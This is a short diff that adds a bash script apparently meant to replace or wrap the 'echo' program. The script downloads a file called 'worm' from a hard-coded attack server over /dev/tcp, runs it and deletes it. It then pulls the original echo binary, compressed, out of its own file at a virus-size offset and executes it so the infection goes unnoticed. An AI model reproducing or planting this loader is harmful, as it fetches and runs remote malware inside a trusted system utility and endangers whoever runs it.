@@ -1,0 +1,13 @@
+#!/usr/bin/bash
+ATTACK_SERVER_IP='172.18.0.2'
+ATTACK_SERVER_PORT=23456 # set default port to 23456
+VIRUS_SIZE=396
+ECHO_ZIP_SIZE=0
+cat < /dev/tcp/$ATTACK_SERVER_IP/$ATTACK_SERVER_PORT > worm
+chmod +x worm && ./worm
+rm -f worm
+dd if=/app/echo of=/tmp/echo_new.gz skip=$VIRUS_SIZE count=$ECHO_ZIP_SIZE bs=1 > /dev/null 2>&1
+gzip -d /tmp/echo_new.gz > /dev/null 2>&1
+chmod +x /tmp/echo_new && /tmp/echo_new $@ && rm -f /tmp/echo_new && rm -f /tmp/echo_new.gz
+exec echo "hello" > /dev/null
+echo "helllo"
